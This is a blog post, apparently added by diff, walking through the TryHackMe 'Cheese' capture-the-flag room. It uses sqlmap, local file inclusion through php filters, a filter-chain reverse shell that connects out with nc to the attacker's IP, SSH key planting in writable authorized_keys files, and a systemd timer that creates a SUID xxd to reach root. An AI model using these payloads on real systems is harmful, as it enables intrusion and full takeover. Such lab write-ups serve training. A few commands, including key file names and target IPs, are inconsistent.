@@ -1,0 +1,108 @@
+---
+layout: post
+title:  "Cheese (THM)"
+date:   2025-08-02 17:40:43 -0400
+author: robo.uzi
+tags: [TryHackMe, ctf]
+---
+
+## Initial Compromise
+
+I run `nmap -sVC -T3 -oN cheesenmap.txt 10.10.60.166`. Nmap is useless on this room due to port spoofing.
+
+I find an apache server on default port `80`. It's a login page.
+
+Nothing apparent on the login screen. No helpful error messages so far.
+
+I capture a login attempt with burpsuite and run the command `sqlmap -r req.txt --dump`
+
+sqlmap finds a 302 redirect to: `http://10.10.60.166/secret-script.php?file=supersecretadminpanel.html`
+
+I see on the page they are using php filters: 
+```html
+<li><a href="[secret-script.php?file=php://filter/resource=orders.html](view-source:http://10.10.60.166/secret-script.php?file=php://filter/resource=orders.html)">Orders</a></li>
+```
+
+I can see the source code of the secret script with `curl` and `base64`: `curl -s 'http://10.10.60.166/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php' | base64 -d`
+
+```shell
+<?php  
+ //echo "Hello World";  
+ if(isset($_GET['file'])) {  
+   $file = $_GET['file'];  
+   include($file);  
+ }  
+?>
+```
+
+To exploit the server I download `php_filter_chain_generator.py` from [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator).
+
+I use this command to generate a payload for a reverse shell: 
+```shell
+python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.66.123 4444 >/tmp/f"); ?>' | grep '^php' > payload.txt
+```
+
+Set the listener with `rlwrap nc -lvnp 4444` and serve `payload.txt` with `python3 -m http.server`. Then visit `http://10.10.60.166/secret-script.php?file=http://10.13.66.123:8000/payload.txt`. This gets a shell as `www-data`.
+
+___
+
+## Privilege Escalation
+
+I search for writeable files with `find / -type f -writable 2>/dev/null` and find `/home/comte/.ssh/authorized_keys`.
+
+I can just add an ssh key and login.
+
+I generate a key with `ssh-keygen -f key -t ed25519`
+
+I run `echo 'ssh-ed25519 AAAAC3NzaC1lZDI1N...HW79LFuJDUxbwAOj' > /home/comte/.ssh/authorized_keys` on the machine.
+
+Now I can ssh with `ssh -i id_rsa comte@10.10.60.166` with the password `password`.
+
+I run `sudo -l` as `comte` and find:
+```
+   (ALL) NOPASSWD: /bin/systemctl daemon-reload  
+   (ALL) NOPASSWD: /bin/systemctl restart exploit.timer  
+   (ALL) NOPASSWD: /bin/systemctl start exploit.timer  
+   (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
+```
+
+I run `cat /etc/systemd/system/exploit.timer` and get
+```
+[Unit]  
+Description=Exploit Timer  
+  
+[Timer]  
+OnBootSec=  
+  
+[Install]  
+WantedBy=timers.target
+```
+I can see the `OnBootSec=` has no value.
+
+I run `cat /etc/systemd/system/exploit.service`  
+```
+[Unit]  
+Description=Exploit Service  
+  
+[Service]  
+Type=oneshot  
+ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
+```
+I see it copies the `xxd` binary to `opt` and sets the SUID bit
+
+Fix the `exploit.timer` by adding `OnBootSec=10s`.
+
+Then run
+```
+sudo /bin/systemctl daemon-reload
+sudo /bin/systemctl start exploit.timer
+systemctl status exploit.timer
+```
+
+There is now an `xxd` binary in `/opt` with the SUID bit set. Going to [https://gtfobins.github.io/gtfobins/xxd/](https://gtfobins.github.io/gtfobins/xxd/) shows that I can write to files with it. 
+
+This can be used to add an ssh key for the root user. I will use the same key I generated before: `echo 'ssh-ed25519 AAAAC3NzaC1lZDI1N...HW79LFuJDUxbwAOj' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys`
+
+`ssh -i id_rsa root@10.10.89.93` and get the root flag
+
+____
